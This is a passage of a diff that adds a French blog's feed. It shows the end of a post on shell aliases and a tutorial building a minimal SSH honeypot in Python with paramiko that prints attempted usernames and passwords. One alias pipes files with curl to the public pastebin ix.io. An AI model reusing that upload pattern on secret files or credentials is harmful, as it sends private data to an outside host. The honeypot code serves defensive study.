+&lt;span class="s2"&gt;                  -%C(auto)%d%Creset %s %Cgreen(%cr) %C(bold blue)&amp;lt;%an&amp;gt;%Creset&amp;#39; --abbrev-commit --date=relative&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;ou (plus propre), dans votre &lt;code&gt;~/.gitconfig&lt;/code&gt; :&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;[alias]&lt;/span&gt;
+
+&lt;span class="na"&gt;graph&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;log --color --graph --pretty=format:&amp;#39;%Cred%h%Creset  -%C(auto)%d%Creset %s %Cgreen(%cr) %C(bold blue)&amp;lt;%an&amp;gt;%Creset&amp;#39; --abbrev-commit --date=relative&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;ix.io&lt;/h3&gt;
+&lt;p&gt;Vous connaissez &lt;a href="ix.io"&gt;http://ix.io&lt;/a&gt; ? C'est une sorte de &lt;em&gt;pastebin&lt;/em&gt; adapté à la ligne de commande. A l'aide de curl, ça permet de poster des documents, et l'appel HTTP retourne l'url à &lt;em&gt;curler&lt;/em&gt; pour le récupérer. Super utile pour partager des &lt;em&gt;snippets&lt;/em&gt; de code entre collègues (attention, cependant, ce n'est absolument pas confidentiel.)&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;alias&lt;/span&gt; &lt;span class="nv"&gt;internet&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;curl -F &amp;#39;f:1=&amp;lt;-&amp;#39; ix.io&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;ça permet d'écrire des trucs du style:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ cat file.py &lt;span class="p"&gt;|&lt;/span&gt; internet
+http://ix.io/oifkl
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;ou encore (très pratique)&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ cat ~/.ssh/id_rsa.pub &lt;span class="p"&gt;|&lt;/span&gt; internet
+http://ix.io/pjzee
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;ça marche même avec de petits fichiers binaires !&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ feh &lt;span class="sb"&gt;`&lt;/span&gt;cat ~/images/selfie_nude.png &lt;span class="p"&gt;|&lt;/span&gt; internet&lt;span class="sb"&gt;`&lt;/span&gt;
+*magic shows upx*
+&lt;/pre&gt;&lt;/div&gt;</content><category term="bash"></category><category term="alias"></category></entry><entry><title>SSH Honey pot avec python et paramiko</title><link href="http://blog.devsda.fr/ssh-honeypot-python-paramiko.html" rel="alternate"></link><published>2014-12-19T10:20:00+01:00</published><updated>2014-12-19T10:20:00+01:00</updated><author><name>Thomas</name></author><id>tag:blog.devsda.fr,2014-12-19:/ssh-honeypot-python-paramiko.html</id><summary type="html">&lt;p&gt;Développer un honeypot SSH ultra-basique.&lt;/p&gt;</summary><content type="html">&lt;p&gt;Ces derniers temps, je me suis un peu interessé à la librairie &lt;code&gt;paramiko&lt;/code&gt; qui permet d'abstraire le protocole SSH avec python.
+J'en ai profité pour réaliser un petit honeypot ssh histoire d'exporer les possibilités de cette libraire.&lt;/p&gt;
+&lt;h2&gt;Serveur - paramiko.ServerInterface&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;paramiko&lt;/span&gt;
+
+&lt;span class="n"&gt;paramiko&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;util&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;log_to_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;demo_server.log&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;host_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;paramiko&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RSAKey&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;test_rsa.key&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="c1"&gt;# implémentation des différentes méthodes qui vont nous servir.&lt;/span&gt;
+&lt;span class="c1"&gt;# On a pas besoin de grand chose, étant donné que l&amp;#39;on veut juste&lt;/span&gt;
+&lt;span class="c1"&gt;# récupérer les identifiants et non établir une vraie connexion SSH.&lt;/span&gt;
+
+&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Server&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;paramiko&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ServerInterface&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;Paramiko powered SSH Server - basic implementation&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
+
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;check_auth_password&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;{}:{}&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;paramiko&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AUTH_FAILED&lt;/span&gt;
+
+    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_allowed_auths&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;Return a comma separated list of&lt;/span&gt;
+&lt;span class="sd"&gt;        valid auth.&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Voilà, ça ne fait pas beaucoup de code. On a redéfini quelques méthodes de paramiko.ServerInterface :&lt;/p&gt;
+&lt;h4&gt;get_allowed_auths :&lt;/h4&gt;
+&lt;p&gt;D'après la doc:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;get_allowed_auths&lt;/span&gt;&lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;username&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;
+&lt;span class="k"&gt;Return&lt;/span&gt; &lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="nv"&gt;list&lt;/span&gt; &lt;span class="nv"&gt;of&lt;/span&gt; &lt;span class="nv"&gt;authentication&lt;/span&gt; &lt;span class="nv"&gt;methods&lt;/span&gt; &lt;span class="nv"&gt;supported&lt;/span&gt; &lt;span class="nv"&gt;by&lt;/span&gt; &lt;span class="nv"&gt;the&lt;/span&gt; &lt;span class="nv"&gt;server&lt;/span&gt;. &lt;span class="nv"&gt;This&lt;/span&gt; &lt;span class="nv"&gt;list&lt;/span&gt; &lt;span class="nv"&gt;is&lt;/span&gt; &lt;span class="nv"&gt;sent&lt;/span&gt; &lt;span class="nv"&gt;to&lt;/span&gt; &lt;span class="nv"&gt;clients&lt;/span&gt; &lt;span class="nv"&gt;attempting&lt;/span&gt; &lt;span class="nv"&gt;to&lt;/span&gt; &lt;span class="nv"&gt;authenticate&lt;/span&gt;, &lt;span class="nv"&gt;to&lt;/span&gt; &lt;span class="nv"&gt;inform&lt;/span&gt; &lt;span class="nv"&gt;them&lt;/span&gt; &lt;span class="nv"&gt;of&lt;/span&gt; &lt;span class="nv"&gt;authentication&lt;/span&gt; &lt;span class="nv"&gt;methods&lt;/span&gt; &lt;span class="nv"&gt;that&lt;/span&gt; &lt;span class="nv"&gt;might&lt;/span&gt; &lt;span class="nv"&gt;be&lt;/span&gt; &lt;span class="nv"&gt;successful&lt;/span&gt;.
+
+&lt;span class="nv"&gt;The&lt;/span&gt; “&lt;span class="nv"&gt;list&lt;/span&gt;” &lt;span class="nv"&gt;is&lt;/span&gt; &lt;span class="nv"&gt;actually&lt;/span&gt; &lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="nv"&gt;string&lt;/span&gt; &lt;span class="nv"&gt;of&lt;/span&gt; &lt;span class="nv"&gt;comma&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;separated&lt;/span&gt; &lt;span class="nv"&gt;names&lt;/span&gt; &lt;span class="nv"&gt;of&lt;/span&gt; &lt;span class="nv"&gt;types&lt;/span&gt; &lt;span class="nv"&gt;of&lt;/span&gt; &lt;span class="nv"&gt;authentication&lt;/span&gt;. &lt;span class="nv"&gt;Possible&lt;/span&gt; &lt;span class="nv"&gt;values&lt;/span&gt; &lt;span class="nv"&gt;are&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;password&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;publickey&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;, &lt;span class="nv"&gt;and&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;none&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;.
+
+&lt;span class="nv"&gt;The&lt;/span&gt; &lt;span class="nv"&gt;default&lt;/span&gt; &lt;span class="nv"&gt;implementation&lt;/span&gt; &lt;span class="nv"&gt;always&lt;/span&gt; &lt;span class="nv"&gt;returns&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;password&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;.
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;cette fonction permet de préciser au client par quel(s) moyen(s) il peut se connecter à ce serveur SSH.&lt;/p&gt;
+&lt;h4&gt;check_auth_password :&lt;/h4&gt;
+&lt;p&gt;Egalement, d'après la doc:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;check_auth_password&lt;/span&gt;&lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;username&lt;/span&gt;, &lt;span class="nv"&gt;password&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt;
+&lt;span class="nv"&gt;Determine&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nv"&gt;a&lt;/span&gt; &lt;span class="nv"&gt;given&lt;/span&gt; &lt;span class="nv"&gt;username&lt;/span&gt; &lt;span class="nv"&gt;and&lt;/span&gt; &lt;span class="nv"&gt;password&lt;/span&gt; &lt;span class="nv"&gt;supplied&lt;/span&gt; &lt;span class="nv"&gt;by&lt;/span&gt; &lt;span class="nv"&gt;the&lt;/span&gt; &lt;span class="nv"&gt;client&lt;/span&gt; &lt;span class="nv"&gt;is&lt;/span&gt; &lt;span class="nv"&gt;acceptable&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nv"&gt;use&lt;/span&gt; &lt;span class="nv"&gt;in&lt;/span&gt; &lt;span class="nv"&gt;authentication&lt;/span&gt;.
+
+&lt;span class="k"&gt;Return&lt;/span&gt; &lt;span class="nv"&gt;AUTH_FAILED&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nv"&gt;the&lt;/span&gt; &lt;span class="nv"&gt;password&lt;/span&gt; &lt;span class="nv"&gt;is&lt;/span&gt; &lt;span class="nv"&gt;not&lt;/span&gt; &lt;span class="nv"&gt;accepted&lt;/span&gt;, &lt;span class="nv"&gt;AUTH_SUCCESSFUL&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nv"&gt;the&lt;/span&gt; &lt;span class="nv"&gt;password&lt;/span&gt; &lt;span class="nv"&gt;is&lt;/span&gt; &lt;span class="nv"&gt;accepted&lt;/span&gt; &lt;span class="nv"&gt;and&lt;/span&gt; &lt;span class="nv"&gt;completes&lt;/span&gt; &lt;span class="nv"&gt;the&lt;/span&gt; &lt;span class="nv"&gt;authentication&lt;/span&gt;, &lt;span class="nv"&gt;or&lt;/span&gt; &lt;span class="nv"&gt;AUTH_PARTIALLY_SUCCESSFUL&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nv"&gt;your&lt;/span&gt; &lt;span class="nv"&gt;authentication&lt;/span&gt; &lt;span class="nv"&gt;is&lt;/span&gt; &lt;span class="nv"&gt;stateful&lt;/span&gt;, &lt;span class="nv"&gt;and&lt;/span&gt; &lt;span class="nv"&gt;this&lt;/span&gt; &lt;span class="nv"&gt;key&lt;/span&gt; &lt;span class="nv"&gt;is&lt;/span&gt; &lt;span class="nv"&gt;accepted&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nv"&gt;authentication&lt;/span&gt;, &lt;span class="nv"&gt;but&lt;/span&gt; &lt;span class="nv"&gt;more&lt;/span&gt; &lt;span class="nv"&gt;authentication&lt;/span&gt; &lt;span class="nv"&gt;is&lt;/span&gt; &lt;span class="nv"&gt;required&lt;/span&gt;. &lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;In&lt;/span&gt; &lt;span class="nv"&gt;this&lt;/span&gt; &lt;span class="nv"&gt;latter&lt;/span&gt; &lt;span class="nv"&gt;case&lt;/span&gt;, &lt;span class="nv"&gt;get_allowed_auths&lt;/span&gt; &lt;span class="nv"&gt;will&lt;/span&gt; &lt;span class="nv"&gt;be&lt;/span&gt; &lt;span class="nv"&gt;called&lt;/span&gt; &lt;span class="nv"&gt;to&lt;/span&gt; &lt;span class="nv"&gt;report&lt;/span&gt; &lt;span class="nv"&gt;to&lt;/span&gt; &lt;span class="nv"&gt;the&lt;/span&gt; &lt;span class="nv"&gt;client&lt;/span&gt; &lt;span class="nv"&gt;what&lt;/span&gt; &lt;span class="nv"&gt;options&lt;/span&gt; &lt;span class="nv"&gt;it&lt;/span&gt; &lt;span class="nv"&gt;has&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nv"&gt;continuing&lt;/span&gt; &lt;span class="nv"&gt;the&lt;/span&gt; &lt;span class="nv"&gt;authentication&lt;/span&gt;.&lt;span class="ss"&gt;)&lt;/span&gt;
+
+&lt;span class="nv"&gt;The&lt;/span&gt; &lt;span class="nv"&gt;default&lt;/span&gt; &lt;span class="nv"&gt;implementation&lt;/span&gt; &lt;span class="nv"&gt;always&lt;/span&gt; &lt;span class="nv"&gt;returns&lt;/span&gt; &lt;span class="nv"&gt;AUTH_FAILED&lt;/span&gt;.
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Cette fonction s'occupe donc de vérifier l'authenticité du mot de passe et du nom d'utilisateur.&lt;/p&gt;
+&lt;h2&gt;Accepter des connexions entrantes:&lt;/h2&gt;
+&lt;p&gt;Plus commode, on va créer une socket et la &lt;em&gt;binder&lt;/em&gt; sur le port voulu.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;sock&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;setsockopt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOL_SOCKET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SO_REUSEADDR&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bind&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1025&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;Exception&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Listening ...&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;accept&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;Exception&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;C'est pas super joli, ni maintenable (le code est à l'arrache dans l'espace global), mais ça devrait faire l'affaire.
+Y'a plus qu'à faire quelque chose de &lt;code&gt;client, addr&lt;/code&gt;, les donner à notre serveur pour qu'il s'occupe de l'intéraction SSH.
+Ce bout de code bloque à la ligne &lt;code&gt;client, addr = sock.accept()&lt;/code&gt;. Si l'execution va plus loin que block &lt;code&gt;except&lt;/code&gt;, c'est qu'on a un client connecté.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# on instancie un nouveau Transport avec notre socket client.&lt;/span&gt;
+&lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;paramiko&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Transport&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_server_key&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;host_key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;server&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+
+&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;start_server&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="n"&gt;paramiko&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SSHException&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="c1"&gt;# wait for auth&lt;/span&gt;
+&lt;span class="n"&gt;chan&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;accept&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;chan&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;channel lost.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+
+&lt;span class="c1"&gt;# on n&amp;#39;arrivera jamais jusqu&amp;#39;ici.&lt;/span&gt;
+&lt;span class="n"&gt;chan&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;Plus qu'à tester:&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;venv&lt;span class="o"&gt;)[&lt;/span&gt;thomas@jake ssh-honey&lt;span class="o"&gt;]&lt;/span&gt;$ python main.py
+Listening &lt;span class="k"&gt;for&lt;/span&gt; connection ...
+root:toto
+root:tutu
+root:titi
+channel lost.
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Depuis un autre terminal:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;thomas@jake ~&lt;span class="o"&gt;]&lt;/span&gt;$ ssh root@localhost -p &lt;span class="m"&gt;1025&lt;/span&gt;
+root@localhost&lt;span class="s1"&gt;&amp;#39;s password:&lt;/span&gt;
+&lt;span class="s1"&gt;Permission denied, please try again.&lt;/span&gt;
+&lt;span class="s1"&gt;root@localhost&amp;#39;&lt;/span&gt;s password:
+Permission denied, please try again.
+root@localhost&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password:
+Permission denied &lt;span class="o"&gt;(&lt;/span&gt;password&lt;span class="o"&gt;)&lt;/span&gt;.
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Et voilà. Cette implémentation reste assez minimaliste, et je ne pense pas que cette base de code puisse réellement être utilisée pour un honey pot (du moins, sans quelques ajouts.)
+Mais ça illustre bien l'approche de &lt;em&gt;paramiko&lt;/em&gt;.
+Prochaine étape, faire en sorte que le serveur puisse gérer plusieurs connexions simutanées (&lt;em&gt;asyncIO&lt;/em&gt; ?)&lt;/p&gt;
+&lt;h4&gt;Intégralité du code source d'exemple:&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;
+
+
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
+&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;paramiko&lt;/span&gt;
+
+&lt;span class="c1"&gt;# logging&lt;/span&gt;
+
+&lt;span class="n"&gt;paramiko&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;util&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;log_to_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;demo_server.log&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
